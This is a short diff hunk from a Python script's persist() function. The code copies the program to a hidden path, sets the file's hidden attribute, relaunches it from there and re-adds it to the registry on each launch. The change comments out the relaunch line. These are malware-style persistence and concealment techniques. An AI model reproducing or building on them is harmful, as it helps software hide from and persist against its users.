@@ -344,7 +344,7 @@ def persist():
                 subprocess.call(f'attrib +h "{dest_path}"', shell=True)
 
             # Relaunch from hidden path
-            subprocess.Popen(f'"{dest_path}"', shell=True)
+            # subprocess.Popen(f'"{dest_path}"', shell=True)
             os._exit(0)  # Exit current instance
 
         # Always re-add to registry on launch
